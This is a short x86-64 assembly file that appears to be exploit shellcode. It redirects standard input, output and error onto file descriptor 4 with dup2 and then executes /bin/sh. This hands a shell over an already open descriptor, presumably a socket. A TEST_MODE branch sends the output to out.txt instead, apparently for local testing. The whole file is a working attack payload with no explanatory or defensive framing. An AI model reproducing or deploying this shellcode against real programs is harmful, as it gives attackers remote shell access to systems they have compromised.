bits 64

out_file db "out.txt", 0
shell db "/bin/sh", 0

global _start

; these constants are taken from /usr/include/x86_64-linux-gnu/asm/unistd_64.h
%define open_syscall_no       0x02
%define dup2_syscall_no       0x21
%define execve_syscall_no     0x3b

; these constants are taken from /usr/include/x86_64-linux-gnu/bits/fcntl.h
%define O_WRONLY 0x1
%define O_CREAT 0o0100
%define O_TRUNC 0o01000

; these constants are taken from /usr/include/x86_64-linux-gnu/sys/stat.h and /usr/include/x86_64-linux-gnu/bits/stat.h
%define S_IRUSR 0o00400
%define S_IWUSR 0o00200

_start:
%ifdef TEST_MODE
	
	%define file_descriptor 0x3

	mov rax, open_syscall_no              ; Set syscall code
	lea rdi, [out_file]                   ; Store the address to the filename
	mov rsi, O_WRONLY | O_CREAT | O_TRUNC ; Set the flags (write, create, truncate)
	mov rdx, S_IRUSR | S_IWUSR            ; Set the modes (read and write permissions for user)
	syscall
%else

	%define file_descriptor 0x4

	mov rax, dup2_syscall_no
	mov rdi, file_descriptor
	mov rsi, 0x0
	syscall
%endif


mov rax, dup2_syscall_no
mov rdi, file_descriptor
mov rsi, 0x1
syscall


mov rax, dup2_syscall_no
mov rdi, file_descriptor
mov rsi, 0x2
syscall


mov rax, execve_syscall_no
lea rdi, [shell]
xor rsi, rsi
xor rdx, rdx
syscall

